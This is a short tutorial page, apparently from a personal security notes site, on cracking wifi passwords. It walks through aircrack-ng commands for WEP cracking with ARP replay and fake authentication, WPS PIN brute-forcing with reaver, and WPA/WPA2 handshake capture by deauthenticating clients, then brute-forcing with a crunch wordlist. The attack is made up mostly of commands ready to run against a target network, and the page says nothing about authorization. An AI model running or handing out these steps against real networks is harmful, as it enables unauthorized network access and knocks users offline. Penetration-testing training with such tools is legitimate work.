---
description: breaking wep, wpa, wpa2 ectc.
---

# Wifi Cracking

### wep hacking

#### Busy wep Networks:

> Note: this methods works on a busy network where the  "#Data" column value increases at a very fast rate.

1. we have to capture a large number of packets for this to work, using the airodump-ng utility.

```bash
airodump-ng --bssid 98:A9:42:27:A2:CA --channel 2 --write wep_capture wlan0mon
```

2. we then use the aircrack-ng utility to crack the password using the captured .cap file.

```bash
aircrack wep_capture.cap
```

3. key found in the `KEY FOUND! [22:22:22:22:22]` remove the columns, then use the password to connect to the wep network.

#### Idle wep Networks:

> In a network thats not busy: you can force the AP to generate new packets new IVs.

**Solution:** Associate with the AP before launching the attack.

1. run a scan with airodump-ng utility.

```
airodump-ng --bssid 98:A9:42:27:A2:CA --channel 2 --write arp_replay wlan0mon
```

2. run the aireplay-ng utility to establish "an Association" with the target network. `--fakeauth 0` denotes running a fake authentication attack once, `-c` mac addr of the target AP, `-h` mac addr of our wlan0mon adapter and the name of the adapter.

```
aireplay-ng --fakeauth 0 -a 98:A9:42:27:A2:CA -h 11:22:33:44:55:66 wlan0mon
```

3. forcing the AP to generate new IVs (ARP Request Replay). This is done by:

* wait for an arp packet.
* capture it, and replay it (retransmit it).
* this causes the AP to produce another packet with a new IV.
* keep doing this till you have enough IVs to crack the key.

4. To carry out the attack, after following steps 1 and 2 for the busy wep networks, then;

`-b` denotes the target mac addr, `--arpreplay` for an arp replay attack.

```
aireplay-ng --arpreplay -b 98:A9:42:27:A2:CA -h 11:22:33:44:55:66 wlan0mon
```

Just wait for some time, then after receiving enough  packets in the `#Data` column, you can now run `aircrack-ng` to crack password. Allow the `airodump-ng` utility to continue running while running the `aircrack-ng` utility.



### wps hacking.

`wash --interface wlan0mon` a wps recon tool to search around for wps enabled AP/routers.

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p><code>wash</code></p></figcaption></figure>

`aireplay-ng --fakeauth 30 -a targetMacAddr -c wirelessAdapterMacAddr wlan0mon` This creates association with the target network every 30 seconds.

`reaver --bssid targetBssid --channel targetChannel -i wlan0mon -vvv --no-associate` running reaver to carryout bruteforcing.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p><code>reaver</code></p></figcaption></figure>

### wpa / wpa2 hacking

`airodump-ng --bssid 98:A9:42:27:A2:CA --channel 10 --write wpa_handshake wlan0mon` to create a handshake .cap file.&#x20;

`aireplay-ng --deauth 20 -a 98:A9:42:27:A2:CA -c A8:9C:ED:3A:5E:B7 wlan0mon` where `-a` is AP macAddr and `-c` is client macAddr.

<figure><img src="../.gitbook/assets/Screenshot from 2023-03-20 15-52-55 (1).png" alt=""><figcaption><p>captured handshake</p></figcaption></figure>

using the `crunch` utility to create a word list for bruteforcing.

`crunch 6 6 abc123 -o test.txt -t a@@bb` use the man crunch for guides.

`aircrackng wpa_handshake-01.cap -w test.txt` to run bruteforce.

